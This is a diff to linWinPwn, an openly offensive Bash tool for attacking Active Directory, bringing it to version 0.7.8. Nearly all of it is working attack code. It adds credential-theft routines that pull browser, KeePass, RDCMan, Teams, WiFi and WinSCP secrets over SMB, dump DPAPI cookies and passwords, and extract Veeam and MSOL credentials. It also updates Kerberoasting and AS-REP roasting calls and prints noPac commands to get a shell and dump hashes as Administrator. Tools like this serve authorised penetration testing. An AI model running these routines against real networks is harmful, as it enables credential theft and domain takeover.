@@ -65,6 +65,7 @@ silenthound="$scripts_dir/silenthound.py"
 windapsearch="$scripts_dir/windapsearch"
 CVE202233679="$scripts_dir/CVE-2022-33679.py"
 targetedKerberoast="$scripts_dir/targetedKerberoast.py"
+FindUncommonShares="$scripts_dir/FindUncommonShares.py"
 nmap=$(which nmap)
 john=$(which john)
 
@@ -76,7 +77,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 0.7.7 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 0.7.8 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -250,6 +251,7 @@ prepare (){
         argument_silenthd="-u ${domain}\\${user} -p ''"
         argument_windap="-d ${domain} -u ${user} -p ''"
         argument_targkerb="-d ${domain} -u ${user} -p ''"
+        argument_finduncshar="-d ${domain} -u ${user} -p ''"
         pass_bool=false
         hash_bool=false
         kerb_bool=false
@@ -281,6 +283,7 @@ prepare (){
         argument_silenthd="-u ${domain}\\${user} -p ${password}"
         argument_windap="-d ${domain} -u ${user} -p ${password}"
         argument_targkerb="-d ${domain} -u ${user} -p ${password}"
+        argument_finduncshar="-d ${domain} -u ${user} -p ${password}"
         auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
     fi
 
@@ -347,6 +350,7 @@ prepare (){
             argument_certsync="-d ${domain} -u ${user} -use-kcache -no-pass"
             argument_donpapi="-k -no-pass ${domain}/${user}"
             argument_targkerb="-d ${domain} -u ${user} -k --no-pass"
+            argument_finduncshar="-d ${domain} -u ${user} -k --no-pass"
             kdc="$(echo $dc_FQDN | cut -d '.' -f 1)"
             auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $krb5cc)"
         else
@@ -378,8 +382,13 @@ prepare (){
         argument_windap="${argument_windap} -v --debug"
         argument_targkerb="${argument_targkerb} -v"
         argument_kerbrute="-v"
+        argument_finduncshar="${argument_finduncshar} -v --debug"
         argument_CVE202233679="-debug"
     fi
+
+    argument_ThePorgs=""
+    impacket_ThePorgs=$($impacket_findDelegation | head -n 1 | grep -v "ThePorgs")
+    if [ -f "${impacket_ThePorgs}" ]; then argument_ThePorgs="-dc-host ${dc_NETBIOS}"; fi
     echo -e ""
 }
 
@@ -473,6 +482,7 @@ bhd_enum () {
                 cd ${output_dir}/DomainRecon/BloodHound
                 ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_${dc_domain}.txt
                 cd ${current_dir}
+                #${crackmapexec} ${cme_verbose} ${target} "${argument_cme[@]}" --bloodhound -ns ${dc_ip} -c All 2>&1 | tee ${output_dir}/BloodHound/cme_bloodhound_output_${dc_domain}.txt 2>&1
             fi
         fi
     fi
@@ -494,6 +504,7 @@ bhd_enum_dconly () {
                 cd ${output_dir}/DomainRecon/BloodHound
                 ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip | tee ${output_dir}/DomainRecon/BloodHound/bloodhound_output_dconly_${dc_domain}.txt
                 cd ${current_dir}
+                #${crackmapexec} ${cme_verbose} ${target} "${argument_cme[@]}" --bloodhound -ns ${dc_ip} -c DCOnly 2>&1 | tee ${output_dir}/BloodHound/cme_bloodhound_output_${dc_domain}.txt 2>&1
             fi
         fi
     fi
@@ -660,7 +671,7 @@ deleg_enum_imp () {
         echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
     else
         echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
-        ${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
+        ${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} ${argument_ThePorgs} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
         if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
             echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
         fi
@@ -871,11 +882,12 @@ asrep_attack () {
                 echo -e "${YELLOW}[i] No credentials for target domain provided. Using $users_list wordlist...${NC}"
                 users_scan_list=${users_list}
             fi
-            ${impacket_GetNPUsers} "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
+            ${impacket_GetNPUsers} "${dc_domain}/" -usersfile ${users_scan_list} -request -dc-ip ${dc_ip} ${argument_ThePorgs} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
             /bin/cat ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt | grep krb5asrep | sed 's/\$krb5asrep\$23\$//' > ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>&1
         else
-            ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip}
-            ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+            ${impacket_GetNPUsers} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs}
+            ${impacket_GetNPUsers} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs} > ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt
+            #${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --asreproast 2>&1 | tee -a ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt 2>&1
         fi
         if grep -q 'error' ${output_dir}/Kerberos/asreproast_output_${dc_domain}.txt; then
             echo -e "${RED}[-] Errors during AS REP Roasting Attack... ${NC}"
@@ -926,7 +938,7 @@ kerberoast_attack () {
             echo -e "${BLUE}[*] Blind Kerberoasting Attack${NC}"
             asrep_user=$(/bin/cat ${output_dir}/Kerberos/asreproast_hashes_${dc_domain}.txt 2>/dev/null| cut -d "@" -f 1 | head -n 1)
             if [ ! "${asrep_user}" == "" ]; then
-                ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} "${dc_domain}/" > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
+                ${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${known_users_list} -dc-ip ${dc_ip} ${argument_ThePorgs} "${dc_domain}/" > ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt 2>&1
                 if grep -q 'error' ${output_dir}/Kerberos/kerberoast_blind_output_${dc_domain}.txt; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
                 else
@@ -937,8 +949,9 @@ kerberoast_attack () {
             fi
         else
             echo -e "${BLUE}[*] Kerberoast Attack${NC}"
-            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain}
-            ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain}
+            ${impacket_GetUserSPNs} ${argument_imp} -request -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain} > ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt
+            #${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --kerberoasting 2>&1 | tee -a ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt 2>&1
             if grep -q 'error' ${output_dir}/Kerberos/kerberoast_output_${dc_domain}.txt; then
                     echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
                 else
@@ -1048,7 +1061,7 @@ shares_cme () {
         curr_targets="Domain Controllers"
     fi
     smb_scan
-    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --shares 2>&1 | tee -a ${output_dir}/Shares/cme_shares_output${dc_domain}.txt 2>&1
+    ${crackmapexec} ${cme_verbose} smb ${servers_smb_list} "${argument_cme[@]}" --shares 2>&1 | tee -a ${output_dir}/Shares/cme_shares_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1063,17 +1076,23 @@ spider_cme () {
     echo -e ""
 }
 
-keepass_scan () {
-    echo -e "${BLUE}[*] Search for KeePass-related files and process${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
-        curr_targets="Domain Controllers"
+finduncshar_scan () {
+    if [ ! -f "${FindUncommonShares}" ]; then
+        echo -e "${RED}[-] Please verify the installation of FindUncommonShares${NC}"
+    else
+        echo -e "${BLUE}[*] Enumerating Shares using FindUncommonShares${NC}"
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
+        if [ "${hash_bool}" == true ]; then
+            echo -e "${PURPLE}[-] FindUncommonShares does not support PtH ${NC}"
+        else
+            smb_scan
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
+            ${FindUncommonShares} ${argument_finduncshar} ${ldaps_param} --dc-ip ${dc_ip} --check-user-access --export-xlsx ${output_dir}/Shares/finduncshar_${dc_domain}.xlsx 2>&1 | tee -a ${output_dir}/Shares/finduncshar_shares_output_${dc_domain}.txt 2>&1
+        fi
     fi
-    smb_scan
-    for i in $(/bin/cat ${servers_smb_list}); do
-        echo -e "${CYAN}[*] keepass_discover of ${i} ${NC}"
-        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M keepass_discover 2>&1 | tee -a ${output_dir}/Shares/keepass_discover_${dc_domain}_${i}.txt
-    done
     echo -e ""
 }
 
@@ -1084,8 +1103,8 @@ nopac_check () {
         ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M nopac 2>&1 | tee -a ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>&1
         if grep -q "VULNEABLE" ${output_dir}/Vulnerabilities/cme_nopac_output_${dc_domain}.txt 2>/dev/null; then
             echo -e "${GREEN}[+] Domain controller vulnerable to noPac found! Follow steps below for exploitation:${NC}"
-            echo -e "Get shell: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -shell [-use-ldap]"
-            echo -e "Dump hashes: noPac.py ${argument_imp} -dc-ip $dc_ip -dc-host ${dc_NETBIOS} --impersonate Administrator -dump [-use-ldap]"
+            echo -e "Get shell: noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -shell [-use-ldap]"
+            echo -e "Dump hashes: noPac.py ${argument_imp} -dc-ip $dc_ip ${argument_ThePorgs} --impersonate Administrator -dump [-use-ldap]"
         fi
     done
     echo -e ""
@@ -1231,7 +1250,7 @@ mssql_enum () {
             ${windapsearch} ${argument_windap} --dc ${dc_ip} -m custom --filter "(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))" --attrs dNSHostName | grep dNSHostName | cut -d " " -f 2 | sort -u  >> ${sql_hostname_list}
         fi
         if [ "${nullsess_bool}" == false ]; then
-            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
+            ${impacket_GetUserSPNs} ${argument_imp} -dc-ip ${dc_ip} ${argument_ThePorgs} -target-domain ${dc_domain} | grep "MSSQLSvc" | cut -d "/" -f 2 | cut -d ":" -f 1 | cut -d " " -f 1 | sort -u >> ${sql_hostname_list}
 
         fi
         for i in $(/bin/cat ${sql_hostname_list} 2>/dev/null ); do
@@ -1247,9 +1266,54 @@ mssql_enum () {
 }
 
 ###### Password Dump
+
+juicycreds_dump () {
+    echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
+    if [ "${kerb_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+        curr_targets="Domain Controllers"
+    fi
+    smb_scan
+    for i in $(/bin/cat ${servers_smb_list}); do
+        echo -e "${CYAN}[*] Searching in ${i} ${NC}"
+        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M firefox 2>&1 | tee -a ${output_dir}/Credentials/firefox_${dc_domain}_${i}.txt
+        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M keepass_discover 2>&1 | tee -a ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt
+        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M rdcman 2>&1 | tee -a ${output_dir}/Credentials/rdcman_${dc_domain}_${i}.txt
+        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M teams_localdb 2>&1 | tee -a ${output_dir}/Credentials/teams_localdb_${dc_domain}_${i}.txt
+        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M wireless 2>&1 | tee -a ${output_dir}/Credentials/wireless_${dc_domain}_${i}.txt
+        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M wifi 2>&1 | tee -a ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt
+        ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" -M winscp 2>&1 | tee -a ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt
+    done
+    echo -e ""
+}
+
+msol_dump () {
+    echo -e "${BLUE}[*] MSOL password dump${NC}"
+    target_msol=""
+    read -p ">> " target_msol </dev/tty
+    while [ ! -s "${target_msol}" ] ; do
+        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+        read -p ">> " target_msol </dev/tty
+    done
+    ${crackmapexec} ${cme_verbose} smb ${target_msol} "${argument_cme[@]}" -M msol 2>&1 | tee -a ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt
+    echo -e ""
+}
+
+veeam_dump () {
+    echo -e "${BLUE}[*] Veeam credentials Dump${NC}"
+    target_veeam=""
+    read -p ">> " target_veeam </dev/tty
+    while [ ! -s "${target_veeam}" ] ; do
+        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+        read -p ">> " target_veeam </dev/tty
+    done
+    ${crackmapexec} ${cme_verbose} smb ${target_veeam} "${argument_cme[@]}" -M veeam 2>&1 | tee -a ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt
+    echo -e ""
+}
+
 laps_dump () {
     echo -e "${BLUE}[*] LAPS Dump${NC}"
-    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" -M laps --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/DomainRecon/cme_laps_output_${dc_domain}.txt 2>&1
+    ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" -M laps --kdcHost "${kdc}.${dc_domain}" 2>&1 | tee ${output_dir}/Credentials/laps_dump_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1258,7 +1322,7 @@ gmsa_dump () {
     if [ "${nullsess_bool}" == true ] ; then
         echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
     else
-        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" --gmsa 2>&1 | tee ${output_dir}/DomainRecon/cme_gMSA_${dc_domain}.txt
+        ${crackmapexec} ${cme_verbose} ldap ${target} "${argument_cme[@]}" --gmsa 2>&1 | tee ${output_dir}/Credentials/gMSA_dump_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -1413,6 +1477,24 @@ nanodump_dump () {
     echo -e ""
 }
 
+dpapi_dump () {
+    echo -e "${BLUE}[*] Dumping DPAPI secrets using crackmapexec${NC}"
+    if [ "${nullsess_bool}" == true ] ; then
+        echo -e "${PURPLE}[-] DPAPI dump requires credentials${NC}"
+    else
+        if [ "${kerb_bool}" == true ]; then
+            echo -e "${PURPLE}[-] Targeting DCs only${NC}"
+            curr_targets="Domain Controllers"
+        fi
+        smb_scan
+        for i in $(/bin/cat ${servers_smb_list}); do
+            echo -e "${CYAN}[*] DPAPI dump of ${i} using crackmapexec ${NC}"
+            ${crackmapexec} ${cme_verbose} smb ${i} "${argument_cme[@]}" --dpapi "cookies,password" 2>&1 | tee -a ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt
+        done
+    fi
+    echo -e ""
+}
+
 donpapi_dump () {
     if [ ! -f "${donpapi}" ] ; then
         echo -e "${RED}[-] DonPAPI.py not found! Please verify the installation of DonPAPI${NC}"
@@ -1526,15 +1608,15 @@ scan_shares () {
     smb_map
     shares_cme
     spider_cme
-    keepass_scan
 }
 
 pwd_dump () {
+    juicycreds_dump
     laps_dump
     gmsa_dump
     secrets_dump
     lsassy_dump
-    donpapi_dump
+    dpapi_dump
 }
 
 vuln_checks () {
@@ -1825,7 +1907,7 @@ shares_menu () {
     echo -e "1) SMB shares Scan using smbmap"
     echo -e "2) SMB shares Enumeration using crackmapexec"
     echo -e "3) SMB shares Spidering using crackmapexec "
-    echo -e "4) KeePass Discovery using crackmapexec"
+    echo -e "4) SMB shares Scan using FindUncommonShares"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1857,7 +1939,7 @@ shares_menu () {
         ;;
 
         4)
-        keepass_scan
+        finduncshar_scan
         shares_menu
         ;;
 
@@ -1999,9 +2081,13 @@ pwd_menu () {
     echo -e "10) Dump LSASS using procdump"
     echo -e "11) Dump LSASS using nanodump"
     echo -e "12) Dump LSASS using masky (ADCS required)"
-    echo -e "13) Dump secrets using DonPAPI"
-    echo -e "14) Dump NTDS using certsync (ADCS required) (only on DC)"
-    echo -e "15) Dump secrets using hekatomb (only on DC)"
+    echo -e "13) Dump dpapi secrets using crackmapexec"
+    echo -e "14) Dump secrets using DonPAPI"
+    echo -e "15) Dump NTDS using certsync (ADCS required) (only on DC)"
+    echo -e "16) Dump secrets using hekatomb (only on DC)"
+    echo -e "17) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
+    echo -e "18) Dump Veeam credentials (only from Veeam server)"
+    echo -e "19) Dump Msol password (only from Azure AD-Connect server)"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -2078,17 +2164,37 @@ pwd_menu () {
         ;;
 
         13)
-        donpapi_dump
+        dpapi_dump
         pwd_menu
         ;;
 
         14)
-        certsync_ntds_dump
+        donpapi_dump
         pwd_menu
         ;;
 
         15)
+        certsync_ntds_dump
+        pwd_menu
+        ;;
+
+        16)
         hekatomb_dump
+        pwd_menu
+        ;;
+
+        17)
+        juicycreds_dump
+        pwd_menu
+        ;;
+
+        18)
+        veeam_dump
+        pwd_menu
+        ;;
+
+        19)
+        msol_dump
         pwd_menu
         ;;
 
@@ -2156,6 +2262,7 @@ config_menu () {
         if [ ! -f "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not installed${NC}"; else echo -e "${GREEN}[+] DonPAPI is installed${NC}"; fi
         if [ ! -x "${donpapi}" ] ; then echo -e "${RED}[-] DonPAPI is not executable${NC}"; else echo -e "${GREEN}[+] DonPAPI is executable${NC}"; fi
         if [ ! -f "${hekatomb}" ] ; then echo -e "${RED}[-] HEKATOMB is not installed${NC}"; else echo -e "${GREEN}[+] hekatomb is installed${NC}"; fi
+        if [ ! -f "${FindUncommonShares}" ] ; then echo -e "${RED}[-] FindUncommonShares is not installed${NC}"; else echo -e "${GREEN}[+] FindUncommonShares is installed${NC}"; fi
         config_menu
         ;;
 
